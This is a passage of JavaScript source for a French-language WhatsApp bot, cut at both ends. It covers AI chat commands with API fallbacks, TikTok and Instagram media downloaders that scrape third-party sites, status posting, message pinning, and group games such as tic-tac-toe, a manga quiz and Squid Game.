  const question = args.join(' ');
  if (!question) {
    await sock.sendMessage(remoteJid, {
      text: `🤖 *ChatGPT*\n\nUsage: ${config.prefix}gpt [question]\nExemple: ${config.prefix}gpt Explique la relativité`
    }, { quoted: message });
    return;
  }
  try {
    await sock.sendMessage(remoteJid, { react: { text: "🤖", key: message.key } });
    await sock.sendMessage(remoteJid, { text: "⏳ GPT is thinking..." });

    let reply = null;
    let modelUsed = '';

    // 1. Pollinations.ai (100% gratuit, sans clé)
    try {
      const pollUrl = `https://text.pollinations.ai/${encodeURIComponent(question)}?model=openai&seed=42&json=false`;
      const r = await fetch(pollUrl, { signal: AbortSignal.timeout(20000) });
      if (r.ok) {
        const txt = await r.text();
        if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
      }
    } catch(e) { console.error('[Pollinations]', e.message); }

    // 2. OpenAI officiel (si crédits disponibles)
    if (!reply) {
      try {
        const r = await fetch('https://api.openai.com/v1/chat/completions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.openaiApiKey}` },
          body: JSON.stringify({ model: 'gpt-4o-mini', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
          signal: AbortSignal.timeout(20000)
        });
        const d = await r.json();
        if (!d.error && d.choices?.[0]?.message?.content) {
          reply = d.choices[0].message.content.trim();
          modelUsed = 'OpenAI GPT-4o-mini';
        }
      } catch(e) { console.error('[OpenAI]', e.message); }
    }

    // 3. Groq (gratuit - llama3)
    if (!reply && config.groqApiKey) {
      try {
        const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.groqApiKey}` },
          body: JSON.stringify({ model: 'llama3-8b-8192', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
          signal: AbortSignal.timeout(20000)
        });
        const d = await r.json();
        if (!d.error && d.choices?.[0]?.message?.content) {
          reply = d.choices[0].message.content.trim();
          modelUsed = 'Llama 3 (Groq)';
        }
      } catch(e) { console.error('[Groq]', e.message); }
    }

    if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie dans quelques secondes.');

    await sock.sendMessage(remoteJid, {
      text: `🤖 *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
    }, { quoted: message });
    try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
  } catch(e) {
    console.error('GPT ERROR:', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ GPT Error: ${e.message}` }, { quoted: message });
  }
}

// ─── GEMINI ───────────────────────────────────────────────────────────────────
async function handleGemini(sock, args, remoteJid, senderJid, message) {
  const question = args.join(' ');
  if (!question) {
    await sock.sendMessage(remoteJid, {
      text: `✨ *Google Gemini*\n\nUsage: ${config.prefix}gemini [question]\nExemple: ${config.prefix}gemini Qu'est-ce que le Big Bang?`
    }, { quoted: message });
    return;
  }
  try {
    await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });
    await sock.sendMessage(remoteJid, { text: "⏳ Gemini is thinking..." });

    let reply = null, modelUsed = '';

    // 1. Gemini API officielle
    try {
      const r = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contents: [{ parts: [{ text: question }] }], generationConfig: { maxOutputTokens: 1000 } }),
        signal: AbortSignal.timeout(25000)
      });
      const d = await r.json();
      if (!d.error && d.candidates?.[0]?.content?.parts?.[0]?.text) { reply = d.candidates[0].content.parts[0].text.trim(); modelUsed = 'Google Gemini 2.0'; }
    } catch(e) { console.error('[Gemini]', e.message); }

    // 2. Pollinations openai (POST)
    if (!reply) {
      try {
        const r = await fetch('https://text.pollinations.ai/', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'openai', seed: 42 }),
          signal: AbortSignal.timeout(30000)
        });
        if (r.ok) { const t = await r.text(); if (t?.length > 5) { reply = t.trim(); modelUsed = 'GPT-4o (Pollinations)'; } }
      } catch(e) { console.error('[Pollinations openai]', e.message); }
    }

    // 3. Pollinations mistral (POST)
    if (!reply) {
      try {
        const r = await fetch('https://text.pollinations.ai/', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'mistral', seed: 42 }),
          signal: AbortSignal.timeout(30000)
        });
        if (r.ok) { const t = await r.text(); if (t?.length > 5) { reply = t.trim(); modelUsed = 'Mistral (Pollinations)'; } }
      } catch(e) { console.error('[Pollinations mistral]', e.message); }
    }

    if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie plus tard.');

    await sock.sendMessage(remoteJid, {
      text: `✨ *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
    }, { quoted: message });
    try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
  } catch(e) {
    console.error('GEMINI ERROR:', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Gemini Error: ${e.message}` }, { quoted: message });
  }
}

// ─── TIKTOK ──────────────────────────────────────────────────────────────────
async function handleTikTok(sock, args, remoteJid, senderJid, message) {
  try {
    // Headers pour savett.cc
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      Origin: 'https://savett.cc',
      Referer: 'https://savett.cc/en1/download',
      'User-Agent': 'Mozilla/5.0'
    };

    // Helpers
    async function getCsrfCookie() {
      const res = await axios.get('https://savett.cc/en1/download', { headers });
      const csrf = res.data.match(/name="csrf_token" value="([^"]+)"/)?.[1] || null;
      const cookie = (res.headers['set-cookie'] || []).map(v => v.split(';')[0]).join('; ');
      return { csrf, cookie };
    }

    async function postDl(url, csrf, cookie) {
      const body = `csrf_token=${encodeURIComponent(csrf)}&url=${encodeURIComponent(url)}`;
      const res = await axios.post('https://savett.cc/en1/download', body, {
        headers: { ...headers, Cookie: cookie },
        timeout: 30000
      });
      return res.data;
    }

    function parseHtml(html) {
      const $ = cheerio.load(html);
      const data = {
        username: $('#video-info h3').first().text().trim() || null,
        type: null,
        downloads: { nowm: [], wm: [] },
        mp3: [],
        slides: []
      };

      const slides = $('.carousel-item[data-data]');
      if (slides.length) {
        data.type = 'photo';
        slides.each((_, el) => {
          try {
            const json = JSON.parse($(el).attr('data-data').replace(/&quot;/g, '\"'));
            if (Array.isArray(json.URL)) {
              json.URL.forEach(url => data.slides.push({ index: data.slides.length + 1, url }));
            }
          } catch {}
        });
        return data;
      }

      data.type = 'video';
      $('#formatselect option').each((_, el) => {
        const label = $(el).text().toLowerCase();
        const raw = $(el).attr('value');
        if (!raw) return;
        try {
          const json = JSON.parse(raw.replace(/&quot;/g, '\"'));
          if (!json.URL) return;
          if (label.includes('mp4') && !label.includes('watermark')) data.downloads.nowm.push(...json.URL);
          if (label.includes('watermark')) data.downloads.wm.push(...json.URL);
          if (label.includes('mp3')) data.mp3.push(...json.URL);
        } catch {}
      });
      return data;
    }

    async function savett(url) {
      const { csrf, cookie } = await getCsrfCookie();
      if (!csrf) throw new Error('CSRF token not found');
      const html = await postDl(url, csrf, cookie);
      return parseHtml(html);
    }

    async function fetchBuf(u) {
      try {
        const r = await axios.get(u, { responseType: 'arraybuffer', timeout: 30000 });
        return Buffer.from(r.data);
      } catch (e) {
        console.error('[TIKTOK] fetch error', e?.message);
        return null;
      }
    }

    // Validation URL
    const url = (args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
      await sock.sendMessage(remoteJid, { text: '❗ Usage: !tiktok <url>\nExample: !tiktok https://vt.tiktok.com/xxxxx' }, { quoted: message });
      return;
    }

    // Message de progression TikTok
    const ttLoadMsg = await sock.sendMessage(remoteJid, {
      text:
`✨ ᴛᴛ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ
───────────────────
🎥 Recherche en cours...
📊 ❤️ - • 💬 - • 👁️ -
 
📥 ▰▰▰▱▱▱▱ 30%
───────────────────
⚡ 𝘗𝘢𝘵𝘪𝘦𝘯𝘵𝘦𝘻...`
    }, { quoted: message });

    const info = await savett(url);
    if (!info) {
      await sock.sendMessage(remoteJid, { text: '❌ Impossible de récupérer les informations.' }, { quoted: message });
      return;
    }

    // Mise à jour barre de progression
    try {
      await sock.sendMessage(remoteJid, {
        text:
`✨ ᴛᴛ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ
───────────────────
🎥 ${info.username || 'TikTok Video'}
📊 ❤️ - • 💬 - • 👁️ -
 
📥 ▰▰▰▰▰▱▱ 75%
───────────────────
⚡ 𝘗𝘢𝘵𝘪𝘦𝘯𝘵𝘦𝘻...`
      }, { quoted: message });
    } catch(e) {}

    // Envoyer vidéos sans watermark
    if (Array.isArray(info.downloads.nowm) && info.downloads.nowm.length) {
      for (const v of info.downloads.nowm.slice(0, 2)) {
        const buf = await fetchBuf(v);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          video: buf,
          caption:
`📥 ᴛɪᴋᴛᴏᴋ ꜱᴀᴠᴇᴅ !
───────────────────
🎬 ${info.username || 'TikTok Video'}
📝 "_Téléchargé sans watermark ✅_"
───────────────────
SEIGNEUR TD 🇷🇴

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 SEIGNEUR TD 🇷🇴`,
          mimetype: 'video/mp4'
        }, { quoted: message });
      }
      return;
    }

    // Vidéos watermark
    if (Array.isArray(info.downloads.wm) && info.downloads.wm.length) {
      for (const v of info.downloads.wm.slice(0, 2)) {
        const buf = await fetchBuf(v);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          video: buf,
          caption:
`📥 ᴛɪᴋᴛᴏᴋ ꜱᴀᴠᴇᴅ !
───────────────────
🎬 ${info.username || 'TikTok Video'}
📝 "_Téléchargé avec watermark_"
───────────────────
SEIGNEUR TD 🇷🇴

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 SEIGNEUR TD 🇷🇴`,
          mimetype: 'video/mp4'
        }, { quoted: message });
      }
      return;
    }

    // Slides photos
    if (Array.isArray(info.slides) && info.slides.length) {
      for (const s of info.slides.slice(0, 6)) {
        const buf = await fetchBuf(s.url);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          image: buf,
          caption:
`📥 ᴛɪᴋᴛᴏᴋ ꜱᴀᴠᴇᴅ !
───────────────────
🎬 ${info.username || 'TikTok Slide'}
📝 "_Slide ${s.index} ✅_"
───────────────────
SEIGNEUR TD 🇷🇴

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 SEIGNEUR TD 🇷🇴`
        }, { quoted: message });
      }
      return;
    }

    await sock.sendMessage(remoteJid, { text: '❌ Aucun média trouvé.' }, { quoted: message });

  } catch (err) {
    console.error('[TIKTOK ERROR]', err);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${err.message || err}` }, { quoted: message });
  }
}

// ─── INSTAGRAM ───────────────────────────────────────────────────────────────

// ═══ Instagram Scraper ═══════════════════════════════════════════════════════
async function reelsvideo(url) {
  try {
    const { data } = await axios.get('https://v3.saveig.app/api/ajaxSearch', {
      params: { q: url, t: 'media', lang: 'en' },
      headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json' },
      timeout: 15000
    });
    if (!data || data.status !== 'ok') return null;

    const $ = cheerio.load(data.data);
    const result = {
      username: $('.user-name a').text().trim() || null,
      thumb: $('.download-items__thumb img').attr('src') || null,
      type: null,
      videos: [],
      images: [],
      mp3: []
    };

    $('.download-items__btn a[download]').each((_, el) => {
      const href = $(el).attr('href');
      const text = $(el).text().toLowerCase();
      if (href) {
        if (text.includes('video') || href.includes('.mp4')) {
          result.videos.push(href);
          result.type = 'video';
        } else if (text.includes('photo')) {
          result.images.push(href);
          result.type = result.type || 'photo';
        }
      }
    });

    return result;
  } catch (e) {
    console.error('[reelsvideo]', e.message);
    return null;
  }
}

async function handleInstagram(sock, args, remoteJid, senderJid, message) {
  try {
    const url = (args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
      return await sock.sendMessage(remoteJid, { 
        text: '❗ Usage: !ig <instagram_url>\nExample: !ig https://www.instagram.com/p/XXXXXXXXX/' 
      }, { quoted: message });
    }

    await sock.sendMessage(remoteJid, { text: '🔎 Recherche et téléchargement en cours...' }, { quoted: message });

    const info = await reelsvideo(url);
    if (!info) {
      return await sock.sendMessage(remoteJid, { text: '❌ Impossible de récupérer les informations.' }, { quoted: message });
    }

    // Résumé
    const summaryLines = [
      `👤 Auteur: ${info.username || 'inconnu'}`,
      `📸 Type: ${info.type || 'inconnu'}`,
      `🖼️ Images: ${info.images?.length || 0}`,
      `🎞️ Vidéos: ${info.videos?.length || 0}`
    ];
    await sock.sendMessage(remoteJid, { text: `✅ Résultat:\n${summaryLines.join('\n')}` }, { quoted: message });

    // Helper download
    async function fetchBuf(u) {
      try {
        const r = await axios.get(u, { responseType: 'arraybuffer', timeout: 30000 });
        return Buffer.from(r.data);
      } catch (e) {
        console.error('[IG] fetch error', e?.message);
        return null;
      }
    }

    // Envoyer vidéos
    if (Array.isArray(info.videos) && info.videos.length) {
      for (const v of info.videos.slice(0, 3)) {
        const buf = await fetchBuf(v);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          video: buf,
          caption: `🎥 Vidéo — ${info.username || 'Instagram'}`,
          mimetype: 'video/mp4'
        }, { quoted: message });
      }
      return;
    }

    // Envoyer images
    if (Array.isArray(info.images) && info.images.length) {
      for (const imgUrl of info.images.slice(0, 6)) {
        const buf = await fetchBuf(imgUrl);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          image: buf,
          caption: `🖼️ Image — ${info.username || 'Instagram'}`
        }, { quoted: message });
      }
      return;
    }

    await sock.sendMessage(remoteJid, { text: '❌ Aucun média trouvé.' }, { quoted: message });

  } catch (err) {
    console.error('[IG ERROR]', err);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${err.message || err}` }, { quoted: message });
  }
}

// =============================================
// 📊 COMMANDES STATUS
// =============================================

// !tostatus — Poster texte/image/vidéo en statut WhatsApp
async function handleToStatus(sock, args, message, remoteJid, senderJid) {
  try {
    const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const text = args.join(' ');

    // Statut texte
    if (!quotedMsg && text) {
      const colors = ['#FF5733','#33FF57','#3357FF','#FF33A8','#FFD700','#00CED1'];
      const bgColor = colors[Math.floor(Math.random() * colors.length)];
      await sock.sendMessage('status@broadcast', {
        text: text,
        backgroundColor: bgColor,
        font: Math.floor(Math.random() * 5),
        statusJidList: [senderJid]
      });
      await sock.sendMessage(remoteJid, {
        text: `✅ *Text status posted!*\n\n📝 "${text}"\n🎨 Couleur: ${bgColor}`
      });
      return;
    }

    // Statut image (répondre à une image)
    if (quotedMsg?.imageMessage) {
      const imgData = quotedMsg.imageMessage;
      const stream = await downloadContentFromMessage(imgData, 'image');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      const caption = text || imgData.caption || '';

      await sock.sendMessage('status@broadcast', {
        image: buffer,
        caption: caption,
        statusJidList: [senderJid]
      });
      await sock.sendMessage(remoteJid, {
        text: `✅ *Image status posted!*\n📝 Caption: ${caption || '(none)'}`
      });
      return;
    }

    // Statut vidéo (répondre à une vidéo)
    if (quotedMsg?.videoMessage) {
      const vidData = quotedMsg.videoMessage;
      const stream = await downloadContentFromMessage(vidData, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);

      await sock.sendMessage('status@broadcast', {
        video: buffer,
        caption: text || '',
        statusJidList: [senderJid]
      });
      await sock.sendMessage(remoteJid, {
        text: `✅ *Video status posted!*`
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📊 *ToStatus - Post a status*\n\nUsage:\n• ${config.prefix}tostatus [texte] → text status\n• Reply to an image + ${config.prefix}tostatus → image status\n• Réponds à une vidéo + ${config.prefix}tostatus → video status`
    });
  } catch(e) {
    console.error('Erreur tostatus:', e);
    await sock.sendMessage(remoteJid, { text: `❌ Error: ${e.message}` });
  }
}

// !groupstatus — Post a status dans le groupe (épingler message)
async function handleGroupStatus(sock, args, message, remoteJid, senderJid, isGroup) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ Group-only command!' });
    return;
  }
  const text = args.join(' ');
  if (!text) {
    await sock.sendMessage(remoteJid, {
      text: `📢 *GroupStatus*\n\nUsage: ${config.prefix}groupstatus [message]\n\nEnvoie un formatted pinned message in the group.`
    });
    return;
  }

  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Ndjamena' });
  try {
    const statusMsg = await sock.sendMessage(remoteJid, {
      text: `📌 *GROUP STATUS*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${text}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n🕐 ${now}\n✍️ Par: @${senderJid.split('@')[0]}`,
      mentions: [senderJid]
    });
    // Épingler le message
    try {
      await sock.sendMessage(remoteJid, {
        pin: { type: 1, time: 604800 }, // 7 jours
        key: statusMsg.key
      });
    } catch(e) { /* silencieux si pas admin */ }
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Error: ${e.message}` });
  }
}

// =============================================
// 🎮 SYSTÈME DE JEUX
// =============================================

// ─── État global des jeux ─────────────────────────────────────────────────
const gameState = new Map(); // remoteJid → { type, data }

// ─── Dispatcher réactions jeux ────────────────────────────────────────────
async function handleGameReaction(sock, message, messageText, remoteJid, senderJid) {
  const state = gameState.get(remoteJid);
  if (!state) return;

  if (state.type === 'tictactoe') {
    await processTTTMove(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'quiz') {
    await processQuizAnswer(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'squidgame') {
    await processSquidReaction(sock, message, messageText, remoteJid, senderJid, state);
  }
}

// =============================================
// ❌⭕ TIC-TAC-TOE
// =============================================
const TTT_EMPTY = '⬜';
const TTT_X     = '❌';
const TTT_O     = '⭕';

function renderTTTBoard(board) {
  return board.reduce((str, cell, i) => str + cell + (i % 3 === 2 ? '\n' : ''), '');
}

function checkTTTWin(board, mark) {
  const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  return wins.some(([a,b,c]) => board[a]===mark && board[b]===mark && board[c]===mark);
}

async function handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Si partie en cours
  if (existing?.type === 'tictactoe') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A TicTacToe game is already in progress!\n\n${renderTTTBoard(existing.data.board)}\nType a number *1-9* to play.\n\n_${config.prefix}ttt stop → abandon_`
    });
    return;
  }

  // Stop la partie
  if (args[0] === 'stop') {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, { text: '🛑 TicTacToe game abandoned.' });
    return;
  }

  // Démarrer
  const player1 = senderJid;
  const player2 = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!player2) {
    await sock.sendMessage(remoteJid, {
      text: `❌⭕ *TIC-TAC-TOE*\n\nUsage: ${config.prefix}tictactoe @adversaire\n\nMention a player to start!\n\nDuring the game, type a number:\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣`,
      mentions: []
    });
    return;
  }

  const board = Array(9).fill(TTT_EMPTY);
  gameState.set(remoteJid, {
    type: 'tictactoe',
    data: {
      board,
      players: [player1, player2],
      marks:   [TTT_X, TTT_O],
      turn: 0,
      startTime: Date.now()
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `❌⭕ *TIC-TAC-TOE COMMENCE!*\n\n` +
      `👤 Joueur 1: @${player1.split('@')[0]} → ❌\n` +
      `👤 Joueur 2: @${player2.split('@')[0]} → ⭕\n\n` +
      `${renderTTTBoard(board)}\n` +
      `*Position:*\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣\n\n` +
      `@${player1.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [player1, player2]
  });
}

async function processTTTMove(sock, message, text, remoteJid, senderJid, state) {
  const { board, players, marks, turn } = state.data;
  const currentPlayer = players[turn];
  const currentMark   = marks[turn];

  if (senderJid !== currentPlayer) return; // Pas ton tour

  const pos = parseInt(text.trim()) - 1;
  if (isNaN(pos) || pos < 0 || pos > 8) return;
  if (board[pos] !== TTT_EMPTY) {
    await sock.sendMessage(remoteJid, { text: '⚠️ That cell is already taken!' });
    return;
  }

  board[pos] = currentMark;

  if (checkTTTWin(board, currentMark)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🏆 *@${currentPlayer.split('@')[0]} GAGNE!* ${currentMark}\n\nFélicitations! 🎉`,
      mentions: [currentPlayer]
    });
    return;
  }

  if (board.every(c => c !== TTT_EMPTY)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🤝 *DRAW!*\nGood game to both of you!`
    });
    return;
  }

  const nextTurn = turn === 0 ? 1 : 0;
  state.data.turn = nextTurn;
  const nextPlayer = players[nextTurn];

  await sock.sendMessage(remoteJid, {
    text: `${renderTTTBoard(board)}\n\n@${nextPlayer.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [nextPlayer]
  });
}

// =============================================
// 🍥 QUIZ MANGA
// =============================================
const QUIZ_MANGA = [
  { q: '🍥 Dans quel anime le personnage Naruto Uzumaki est-il le héros principal?', a: 'naruto', hint: 'C\'est le titre de l\'anime!' },
  { q: '⚔️ Quel est le pouvoir signature de Goku dans Dragon Ball?', a: 'kamehameha', hint: 'K-A-M-E...' },
  { q: '👁️ Comment s\'appelle le pouvoir oculaire de Sasuke?', a: 'sharingan', hint: 'Commence par S' },
  { q: '💀 Dans One Piece, comment s\'appelle le chapeau de paille emblématique de Luffy?', a: 'chapeau de paille', hint: 'C\'est son surnom!' },
  { q: '🗡️ Dans Demon Slayer, quel est le style de respiration principal de Tanjiro?', a: 'eau', hint: 'Un élément liquide' },
  { q: '⚡ Dans Attack on Titan, comment s\'appelle le titan colossal de Bertholdt?', a: 'titan colossal', hint: 'Il est très grand' },
  { q: '🏴‍☠️ Quel est le vrai nom de Zoro dans One Piece?', a: 'roronoa zoro', hint: 'Son nom de famille commence par R' },
  { q: '🔮 Dans Hunter x Hunter, comment s\'appelle l\'énergie vitale que les personnages utilisent?', a: 'nen', hint: '3 lettres' },
  { q: '🌊 Dans My Hero Academia, quel est le Quirk de Midoriya?', a: 'one for all', hint: 'Héritage de All Might' },
  { q: '🌙 Dans Bleach, comment s\'appelle l\'épée spirituelle d\'Ichigo?', a: 'zangetsu', hint: 'Tranche la lune' },
  { q: '🔥 Quel anime suit Tanjiro Kamado chassant des démons pour sauver sa sœur?', a: 'demon slayer', hint: 'Kimetsu no Yaiba' },
  { q: '💥 Dans One Punch Man, pourquoi Saitama est-il devenu chauve?', a: 'entrainement', hint: 'Il a trop...' },
  { q: '🃏 Dans Death Note, quel est le nom du carnet magique?', a: 'death note', hint: 'Le titre de l\'anime!' },
  { q: '🐉 Dans Fairy Tail, quel est le pouvoir de Natsu Dragneel?', a: 'flamme', hint: 'Très chaud!' },
  { q: '⚙️ Dans Fullmetal Alchemist, quels sont les frères Elric?', a: 'edward et alphonse', hint: 'Ed et Al' },
];

async function handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Stop
  if (args[0] === 'stop') {
    if (existing?.type === 'quiz') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Quiz arrêté!\n\n📊 *Score final:*\n' + formatQuizScores(existing.data.scores) });
    } else {
      await sock.sendMessage(remoteJid, { text: '❌ No quiz in progress.' });
    }
    return;
  }

  // Partie déjà en cours
  if (existing?.type === 'quiz') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A quiz is already in progress!\n\n❓ ${existing.data.current.q}\n\n_${config.prefix}quiz stop → stop_`
    });
    return;
  }

  // Nombre de questions
  const total = Math.min(parseInt(args[0]) || 10, 15);
  const questions = [...QUIZ_MANGA].sort(() => Math.random() - 0.5).slice(0, total);

  gameState.set(remoteJid, {
    type: 'quiz',
    data: {
      questions,
      index: 0,
      current: questions[0],
      scores: {},
      total,
      startTime: Date.now(),
      hintUsed: false
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `🍥 *QUIZ MANGA COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📚 *${total} questions* sur les mangas!\nAnswer in chat — first to answer correctly wins the point!\n\n_${config.prefix}quiz stop → stop_\n\n━━━━━━━━━━━━━━━━━━━━━━━\n\n❓ *Question 1/${total}:*\n${questions[0].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint (-1 pt)_`
  });

  // Timer 30s par question
  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up! No one found it.'), 30000);
}

function formatQuizScores(scores) {
  if (Object.keys(scores).length === 0) return '_No points scored_';
  return Object.entries(scores)
    .sort(([,a],[,b]) => b - a)
    .map(([jid, pts], i) => `${i===0?'🥇':i===1?'🥈':'🥉'} @${jid.split('@')[0]}: ${pts} pt(s)`)
    .join('\n');
}

async function advanceQuizQuestion(sock, remoteJid, prefix = '') {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'quiz') return;

  const { questions, index, total, scores } = state.data;
  const nextIndex = index + 1;

  if (nextIndex >= total) {
    // Fin du quiz
    gameState.delete(remoteJid);
    const winner = Object.entries(scores).sort(([,a],[,b]) => b-a)[0];
    await sock.sendMessage(remoteJid, {
      text: `${prefix ? prefix + '\n\n' : ''}🏁 *FIN DU QUIZ MANGA!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📊 *Final ranking:*\n${formatQuizScores(scores)}\n\n${winner ? `🏆 Winner: @${winner[0].split('@')[0]} with ${winner[1]} point(s)!` : 'No winner!'}`,
      mentions: winner ? [winner[0]] : []
    });
    return;
  }

  state.data.index    = nextIndex;
  state.data.current  = questions[nextIndex];
  state.data.hintUsed = false;

  await sock.sendMessage(remoteJid, {
    text: `${prefix ? prefix + '\n\n' : ''}❓ *Question ${nextIndex+1}/${total}:*\n${questions[nextIndex].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint_`
  });

  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up!'), 30000);
}

async function processQuizAnswer(sock, message, text, remoteJid, senderJid, state) {
  const { current, hintUsed, scores } = state.data;
  const prefix = config.prefix;

  // Indice
  if (text.toLowerCase() === `${prefix}hint` || text.toLowerCase() === prefix + 'hint') {
    if (!hintUsed) {
      state.data.hintUsed = true;
      await sock.sendMessage(remoteJid, { text: `💡 *Hint:* ${current.hint}` });
    }
    return;
  }

  // Vérifier réponse
  if (text.toLowerCase().trim() === current.a.toLowerCase()) {
    scores[senderJid] = (scores[senderJid] || 0) + (hintUsed ? 0.5 : 1);
    const pts = scores[senderJid];
    await sock.sendMessage(remoteJid, {
      text: `✅ *CORRECT ANSWER!*\n🎉 @${senderJid.split('@')[0]} → +${hintUsed?'0.5':'1'} pt (Total: ${pts})\n\n📖 Answer: *${current.a}*`,
      mentions: [senderJid]
    });
    await advanceQuizQuestion(sock, remoteJid);
  }
}

// =============================================
// 🦑 SQUID GAME
// =============================================
const SQUID_ROUNDS = [
  { name: '🔴 Feu Rouge / 🟢 Feu Vert', instruction: '🟢 = *AVANCER*  |  🔴 = *RESTER IMMOBILE*\n\nRéagissez with 🟢 pour avancer et survivre!', target: '🟢', wrong: '🔴', duration: 25000 },
  { name: '🍬 Dalgona Challenge', instruction: '🟢 = *DÉCOUPER AVEC SOIN*  |  🔴 = *TROP RAPIDE (éliminé)*\n\nRéagissez with 🟢 pour réussir!', target: '🟢', wrong: '🔴', duration: 20000 },
  { name: '🪆 Marbles Game', instruction: '🟢 = *JOUER*  |  🔴 = *ABANDONNER*\n\nRéagissez with 🟢 pour continuer!', target: '🟢', wrong: '🔴', duration: 30000 },
  { name: '🌉 Glass Bridge', instruction: '🟢 = *VERRE SOLIDE*  |  🔴 = *VERRE FRAGILE (mort)*\n\nRéagissez with 🟢 pour traverser!', target: '🟢', wrong: '🔴', duration: 15000 },
  { name: '🗡️ Round Final - Squid Game', instruction: '🟢 = *ATTAQUER*  |  🔴 = *DÉFENDRE*\n\nRéagissez with 🟢 pour gagner le round final!', target: '🟢', wrong: '🔴', duration: 20000 },
];

async function handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ Squid Game → groups only!' });
    return;
  }

  const existing = gameState.get(remoteJid);
  if (existing?.type === 'squidgame') {
    if (args[0] === 'stop') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Squid Game arrêté par l\'admin.' });
      return;
    }
    await sock.sendMessage(remoteJid, { text: `⚠️ A Squid Game is already in progress!\n_${config.prefix}squidgame stop → stop_` });
    return;
  }

  // Récupérer tous les participants du groupe
  let participants = [];
  try {
